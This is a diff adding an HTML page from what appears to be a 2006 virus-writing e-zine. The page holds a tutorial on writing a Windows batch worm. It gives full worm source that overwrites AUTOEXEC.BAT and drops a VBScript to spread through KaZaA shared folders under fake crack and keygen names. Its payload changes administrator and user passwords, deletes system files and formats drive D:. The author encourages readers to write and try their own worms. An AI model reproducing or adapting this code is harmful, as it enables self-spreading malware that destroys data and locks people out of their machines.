@@ -1,0 +1,129 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: sk0r,Czybik/EOF || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+||Worms 
+||with
+||BATCH
+||______________________________________
+------------------------------------------
++-----------------------------------------------------+
+|Author: sk0r/Czybik                                  |+
+|Translated by: SkyOut                                |+
++-----------------------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
++-----------------------------------------------------+
+|www.sk0r-czybik.de.vu                                |+
+|www.eof-project.net                                  |+
++-----------------------------------------------------++
+ +++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Date: 10th April 2006
+What you should know: Basics of Batch scripting.
+________________________________________________________________________________
+
+Hello,
+this tutorial is for those, who are interested in coding a Batch worm. What do we need to
+do this? To create a worm you need a way to spread automatically, I decided to show you this
+on the basis of P2P networks. Next thing we must do is a function, which the worm will start
+when executed and last, but not least the payload!
+
+I will show you one sample code now and explain the idea behind it, try to understand the
+principle and it shouldn't be a problem anymore for you to code your own worms with that 
+language. The worm consists of three important parts, first it tries to copy itself somewhere
+on the system, then it checks via VBScript whether KaZaA Lite is installed or not, if this
+is the case it copies itself to &quot;My Shared Folder&quot;. The last the thing is the payload. Lets
+come to the code:
+
+==============================================================================================
+==============================================================================================
+
+@echo off
+title P2P Worm Beispiel
+rem Das ist ein Batch.P2P-Wurm
+Cls
+Color 3E
+
+GoTo BackupCopy
+
+:BackupCopy
+set Slash=\
+if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
+          attrib –s –r –h %SystemDrive%%Slash%AUTOEXEC.BAT
+          del %SystemDrive%%Slash%AUTOEXEC.BAT
+          copy %0 %SystemDrive%%Slash%AUTOEXEC.BAT
+          attrib +s +r +h %SystemDrive%%Slash%AUTOEXEC.BAT
+          echo infected the autoexec.bat
+          GoTo KaZaASpread
+)
+
+:KaZaASpread
+echo ' P2P-Spreading.bat by sk0r alias Czybik &gt;&gt; p2pspread.vbs
+echo On Error Resume Next &gt;&gt; p2pspread.vbs
+echo set fso=createobject(&quot;scripting.filesystemobject&quot;) &gt;&gt; p2pspread.vbs
+echo set wshs = createobject(&quot;wscript.shell&quot;) &gt;&gt; p2pspread.vbs
+echo s_kazza = wshs.regread(&quot;HKEY_CURRENT_USER\Software\Kazaa\LocalContent\&quot; + &quot;DownloadDir&quot;) &gt;&gt; p2pspread.vbs
+echo If Not s_kazza = &quot;&quot; Then &gt;&gt; p2pspread.vbs
+echo Set getforkazaa = fso.getfile(%0) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\win_xp_serial.txt.bat&quot;) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\Microsoft MSN Messenger 7.5 Hack.bat&quot;) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\paintshop_pro_crack.exe.bat&quot;) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\win_xp_serial.txt.bat&quot;) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\icq_5_antispam.exe.bat&quot;) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\Kaspersky_Key_Gen.bat&quot;) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\TeamSpeak_2RC2_Hacker.bat&quot;) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\Zip_passw_cracker.bat&quot;) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\official_winxp_keyHacker.bat&quot;) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\HackerTool_2006.bat&quot;) &gt;&gt; p2pspread.vbs
+echo getforkazaa.Copy (s_kazza + &quot;\SourceCode_winxp_sp2.log.bat&quot;) &gt;&gt; p2pspread.vbs
+echo End If &gt;&gt; p2pspread.vbs
+p2pspread.vbs
+del p2pspread.vbs
+GoTo Payload
+
+:Payload
+echo This is the payload
+net user administrator newpassw
+net user %UserName% newpassw2
+time 13.37.00
+date 01.01.00
+cd %SystemRoot%%Slash%
+del *.bmp
+cd %SystemRoot%%Slash%System32
+del *.scr
+format D: /y
+echo Worm owned the system
+pause
+GoTo EndeWorm
+
+:EndeWorm
+cls
+@echo on
+exit
+
+==============================================================================================
+==============================================================================================
+
+OK, now let us look at the code:
+
+The worm checks whether &quot;autoexec.bat&quot; exists on the system partition or not, if the result
+is &quot;true&quot; it will remove the attributes &quot;system file&quot;, &quot;read only&quot; and &quot;hidden&quot; and deletes
+the file. Then the worm copies itself to &quot;autoexec.bat&quot; and sets the attributes again. Now the
+next part is coming. The worm will drop a VBScript file checking for the Registry Key of KaZaA
+Lite, if the program is installed it will copy itself with fake names into &quot;My Shared Folder&quot;.
+It executes the VBScript file doing the operations and deletes it right after this. Lets go to
+the last part. The worm changes the administrator password and the one of the current user. Then
+it changes the date and time. After this it tries to delete every Bitmap file in C:\Windows
+and every SCR file in C:\Windows\System32. As the last thing it will format drive &quot;D:&quot;.
+
+==============================================================================================
+==============================================================================================
+ 
+Comment: This was a very simple tutorial, but now you should understand what the basics of worms
+are. The payload can be coded however you like to have it =) It depends on your creativity!
+
+Have fun trying what you have learned, sk0r/Czybik
+</pre></body></html>
